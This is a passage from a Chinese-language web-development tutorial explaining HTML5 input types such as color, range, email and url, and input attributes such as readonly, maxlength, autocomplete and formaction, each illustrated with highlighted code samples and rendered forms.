id="无时区时间输入-datetime-local"><a href="#无时区时间输入-datetime-local" class="headerlink" title="无时区时间输入 datetime-local"></a>无时区时间输入 datetime-local</h4><p><code>&lt;input type="datetime-local"&gt;</code> 选择日期和时间（无时区）。</p><p>Firefox 或者 Internet Explorer 不支持。Chrome 支持。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  输入一个具体时间（日期和时间）：  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>datetime-local<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bdaytime<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Send<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form action="#">  输入一个具体时间（日期和时间）：  <input type="datetime-local" name="bdaytime"></form><br><h4 id="颜色输入-color"><a href="#颜色输入-color" class="headerlink" title="颜色输入 color"></a>颜色输入 color</h4><p><code>&lt;input type="color"&gt;</code> 用于应该包含颜色的输入字段。</p><p>点击会弹出颜色选择器。</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/color_picker.png" alt="颜色选择器"></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Select your favorite color:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>color<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>favcolor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Select your favorite color:  <input type="color" name="favcolor"></form><br><p>提交的值类似于 <code>favcolor=#ff1234</code>（urlencode后为 <code>favcolor=%23ff1234</code>）</p><p>十六进制形式的颜色RGB形式。</p><h4 id="范围输入-range"><a href="#范围输入-range" class="headerlink" title="范围输入 range"></a>范围输入 range</h4><p><code>&lt;input type="range"&gt;</code> 用于应该包含一定范围内的值的输入字段。</p><p>样式是一个滑块。</p><p>可以使用如下属性来规定限制：min、max、step、value。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  <input type="range" name="points" min="0" max="10"></form><br><h4 id="电子邮件地址输入-email"><a href="#电子邮件地址输入-email" class="headerlink" title="电子邮件地址输入 email"></a>电子邮件地址输入 email</h4><p><code>&lt;input type="email"&gt;</code> 用于应该包含电子邮件地址的输入字段。</p><p>根据浏览器支持，能够在被提交时自动对电子邮件地址进行验证，也可以自己写一个pattern来做简单的有效性验证。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  E-mail:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  E-mail:  <input type="email" name="email"></form><br><h4 id="搜索字段输入-search"><a href="#搜索字段输入-search" class="headerlink" title="搜索字段输入 search"></a>搜索字段输入 search</h4><p><code>&lt;input type="search"&gt;</code> 用于搜索字段（搜索字段的表现类似常规文本字段）。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Search Miao:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miaosearch<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Search Miao:  <input type="search" name="googlesearch"></form><br><h4 id="电话号码的输入-tel"><a href="#电话号码的输入-tel" class="headerlink" title="电话号码的输入 tel"></a>电话号码的输入 tel</h4><p><code>&lt;input type="tel"&gt;</code> 用于应该包含电话号码的输入字段。</p><p>浏览器支持不是很好。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Telephone:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tel<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>usrtel<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Telephone:  <input type="tel" name="usrtel"></form><br><h4 id="URL-地址输入-url"><a href="#URL-地址输入-url" class="headerlink" title="URL 地址输入 url"></a>URL 地址输入 url</h4><p><code>&lt;input type="url"&gt;</code> 用于应该包含 URL 地址的输入字段。</p><p>根据浏览器支持，在提交时能够自动验证 <code>url</code> 字段。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Add your website:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>website<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Add your website:  <input type="url" name="website"></form><br><h4 id="文件输入-上传-file"><a href="#文件输入-上传-file" class="headerlink" title="文件输入/上传 file"></a>文件输入/上传 file</h4><p><code>&lt;input type="file"&gt;</code> 用于指定上传的文件。</p><input type="file"><br><h3 id="input-元素的属性"><a href="#input-元素的属性" class="headerlink" title="input 元素的属性"></a>input 元素的属性</h3><h4 id="value"><a href="#value" class="headerlink" title="value"></a>value</h4><p>指定输入字段的默认值。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Miao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form action="">First name:<br><input type="text" name="firstname" value="Miao"><br>Last name:<br><input type="text" name="lastname"></form><br><h4 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a>readonly</h4><p>只读，不可修改。但它<strong>也会作为参数提交给服务器。</strong></p><p>readonly 属性不需要值。它等同于 readonly=”readonly”。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">readonly</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" readonly=""></form> <br><h4 id="disabled"><a href="#disabled" class="headerlink" title="disabled"></a>disabled</h4><p><em>disabled</em> 属性规定输入字段是禁用的。</p><p>被禁用的元素是不可用和不可点击的。被禁用的元素<strong>不会被提交</strong>。</p><p>disabled 属性也不需要值。它等同于 disabled=”disabled”。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">disabled</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" disabled=""></form> <br><h4 id="size"><a href="#size" class="headerlink" title="size"></a>size</h4><p><em>size</em> 属性规定输入字段的尺寸（以字符计）。</p><p>指的是输入框的长度。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" size="40"></form> <br><h4 id="maxlength"><a href="#maxlength" class="headerlink" title="maxlength"></a>maxlength</h4><p><em>maxlength</em> 属性规定输入字段允许的最大长度。</p><p>一个汉字算作两个字符。</p><p>如设置 maxlength 属性，则输入控件不会接受超过所允许数的字符。</p><p>该属性不会提供任何反馈。如果需要提醒用户，则必须编写 JavaScript 代码。</p><p>注意，无论前端如何做提示，只要知道了提交的地址，照样可以构造一个请求进行提交。因此<strong>后端也要做好相应的输入限制判断</strong>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" maxlength="10"></form> <br><hr><p>以下为H5中的新属性。</p><h4 id="autocomplete"><a href="#autocomplete" class="headerlink" title="autocomplete"></a>autocomplete</h4><p>autocomplete 属性规定表单或输入字段是否应该自动完成。</p><p>当自动完成开启，浏览器会基于用户之前的输入值自动填写值。<strong>默认是开启的。</strong></p><p>可以把表单 form 中的 autocomplete 设置为 on，同时把特定的输入字段设置为 off，反之亦然。这样特定的输入就会优先它自己的设置。</p><p>autocomplete 属性适用于 <code>&lt;form&gt;</code> 以及如下 <code>&lt;input&gt;</code> 类型：text、search、url、tel、email、password、datepickers、range 以及 color。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action="#" autocomplete="on">   First name:<input type="text" name="fname"><br>   Last name: <input type="text" name="lname"><br>   E-mail: <input type="email" name="email" autocomplete="off"><br></form> <br><h4 id="autofocus"><a href="#autofocus" class="headerlink" title="autofocus"></a>autofocus</h4><p>autofocus 属性是布尔属性。</p><p>如果设置，则规定当页面加载时 <code>&lt;input&gt;</code> 元素应该自动获得焦点。</p><p>就是光标自动出现在打了autofocus标签的位置，敲键盘就直接输入到相应的文本框里了。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  Last name:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/input_autofocus.png" alt="autofocus"></p><h4 id="height-amp-width"><a href="#height-amp-width" class="headerlink" title="height &amp; width"></a>height &amp; width</h4><p>规定 <code>&lt;input&gt;</code> 元素的高度和宽度。</p><p>height 和 width 属性仅用于 <code>&lt;input type="image"&gt;</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img_submit.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>48<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>48<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>image 输入类型默认会发生点击图像按钮时的 X 和 Y 坐标。</p><h4 id="min-amp-max"><a href="#min-amp-max" class="headerlink" title="min &amp; max"></a>min &amp; max</h4><p>规定 <code>&lt;input&gt;</code> 元素的最小值和最大值。</p><p>适用的类型：number、range、date、datetime、datetime-local、month、time 以及 week。</p><h4 id="step"><a href="#step" class="headerlink" title="step"></a>step</h4><p>规定 <code>&lt;input&gt;</code> 元素的合法数字间隔。</p><p>示例：如果 step=”3”，则合法数字应该是 -3、0、3、6、等等。</p><p>可与 max 以及 min 属性一同使用，来创建合法值的范围。</p><p>适用于以下输入类型：number、range、date、datetime、datetime-local、month、time 以及 week。</p><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>list 属性引用的 <code>&lt;datalist&gt;</code> 元素中包含了 <code>&lt;input&gt;</code> 元素的预定义选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Internet Explorer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Firefox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Chrome<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Opera<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Safari<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">></span></span> </code></pre><input list="browsers"><datalist id="browsers">   <option value="Internet Explorer">   </option><option value="Firefox">   </option><option value="Chrome">   </option><option value="Opera">   </option><option value="Safari"></option></datalist> <br><h4 id="multiple"><a href="#multiple" class="headerlink" title="multiple"></a>multiple</h4><p>布尔属性。如果设置，则允许在 <code>&lt;input&gt;</code> 元素中输入一个以上的值。</p><p>适用的类型：email 和 file。</p><pre class=" language-html"><code class="language-html">Select images: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img<span class="token punctuation">"</span></span> <span class="token attr-name">multiple</span><span class="token punctuation">></span></span></code></pre><p>Select images: <input type="file" name="img" multiple=""></p><p>上面这个就是允许上传多张图片。</p><h4 id="form"><a href="#form" class="headerlink" title="form"></a>form</h4><p>form 属性规定 <code>&lt;input&gt;</code> 元素所属的一个或多个表单。</p><p>如需引用一个以上的表单，请使用空格分隔的表单 id 列表。</p><p>输入字段位于 HTML 表单之外（但仍属表单）。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>上面这里的<code>lname</code>同样会作为<code>form1</code>表单的一个参数提交给服务器。</p><h4 id="formaction"><a href="#formaction" class="headerlink" title="formaction"></a>formaction</h4><p>formaction 属性规定当提交表单时处理该输入控件的文件的 URL。</p><p>formaction 属性覆盖 <code>&lt;form&gt;</code> 元素的 <code>action</code> 属性。</p><p>适用于 type=”submit” 以及 type=”image”。</p><p>比如可以给单独一个按钮指定不同的提交路径。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html5/demo_admin.asp<span class="token punctuation">"</span></span> <span class="token 